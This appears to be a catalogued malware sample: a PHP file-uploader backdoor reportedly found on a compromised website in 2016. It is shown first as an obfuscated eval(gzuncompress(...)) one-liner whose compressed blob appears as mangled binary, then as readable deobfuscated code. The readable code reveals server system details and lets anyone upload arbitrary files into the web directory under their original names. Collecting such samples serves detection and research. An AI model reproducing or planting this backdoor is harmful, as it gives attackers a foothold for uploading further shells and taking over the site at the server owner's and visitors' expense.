<!--
	Detected: 2016.11.02 on southeastconnection.ca 
	Description: File uploader script
-->

<!-- Original Code -->
<?php eval(gzuncompress("x⁄ïR¡n€0\x0c=/@˛Å».∂∫M{≥‚”l@Ì÷Kr¨T¬,Àê‰nmê/e%Õ%óÍBR||è¢(6“P&ΩnäÒàI¡k¥\x00Ã+ﬂà‚∑TúT˛˚◊MXÔö∞¨2ıÎPì◊Î\x0aV∞4V√÷XËª∆z,´\x0aña2C–xÙ%†gMsÅ]\x24ùÏ æÂZ\x24i:‹–zv¢ﬂRæÒ ¥sBÛi˘∏xxZ<¨Ë˝è{ÙÔñtK\x09h·•©Á§3ŒÌ∆øvbNtﬂx’qÎ≥¿ı≠ÊûìøjªﬁCDnU#ÑÜ¢<ÇO≥ú≈ªæ“\x0a•^x”c¯'>;V|\x0c™éG4W€D9'|2-ó?Ôè+zî°Î4›a˙ò8ÈØWƒ©7¥≈ı’Ïˆ‚Ê\x22òt7\x0cê,ﬁh∏}êhc1ñºÖõ_UJp™ˇïœ˜ÉnøE‘e‡>Ø‰uWF€—ÊE|ÆËÎŸ¸Å0˛9\x09√˘nZ1\x09v∏çªSna≠± ó”∞\x22D⁄=_í#|‹î√‚∫Ñ]¶˘;°â„N")); ?>

<!-- Unminified/compressed code -->
<?php
echo '<html>
	<head>
		<title>This shit works!</title>
	</head>
	<body>
		<h1><p><b> Form for upload! </b></p></h1>
		<h2><p>';
			echo (php_uname());
		echo '</p></h2>
		<form action="'; $_SERVER['PHP_SELF']; echo '" method="post" enctype="multipart/form-data">
			<input type="file" name="filename"><br /> 
			<input type="submit" value="Upload!"><br />
		</form>';

		if (isset($_FILES['filename'])) {
			if ($_FILES["filename"]["size"] > 1024 * 3 * 1024) {
				echo ("File too large (more than 3Mb)");
				exit;
			}

			if (is_uploaded_file($_FILES["filename"]["tmp_name"])) {
				move_uploaded_file($_FILES["filename"]["tmp_name"], $_FILES["filename"]["name"]);
				echo ("<br />Done!<br />");
			} else {
				echo ("<br />Error! " . $php_errormsg . "<br />");
			}
		};
	echo '</body>
</html>';